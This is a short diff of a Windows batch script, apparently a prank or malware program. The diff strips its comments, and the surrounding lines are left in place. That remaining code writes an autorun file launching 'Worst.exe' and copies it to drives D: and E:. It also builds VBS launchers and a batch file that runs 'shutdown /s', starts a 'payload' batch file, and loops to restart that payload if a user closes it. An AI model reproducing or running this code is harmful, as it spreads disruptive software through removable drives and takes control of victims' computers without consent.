@@ -165,7 +165,7 @@ echo ;open=Worst.exe >> windows.inf
 echo ShellExecute=Worst.exe >> windows.inf
 echo UseAutoPlay=1 >> windows.inf
 
-:: Copy windows.inf to usb
+
 
 xcopy /e /y windows.inf D:\
 xcopy /e /y windows.inf E:\
@@ -352,15 +352,14 @@ echo shutdown /s>>Continue.bat
 echo CreateObject("Wscript.Shell").Run "C:\Windows\yes.vbs" & WScript.Arguments(0) & "C:\Windows\Stop.bat", 0, False>yes.vbs
 echo CreateObject("Wscript.Shell").Run "C:\Windows\no.vbs" & WScript.Arguments(0) & "C:\Windows\Continue.bat", 0, False>no.vbs
 
-:: Start the payload (boo)
+
 
 start boo.bat
 
-:: Put on some music
+
 
 start /min https://www.youtube.com/watch?v=DNXXKd4XrcE
 
-:: Restart "boo" if someone closes it
 
 :checker
 
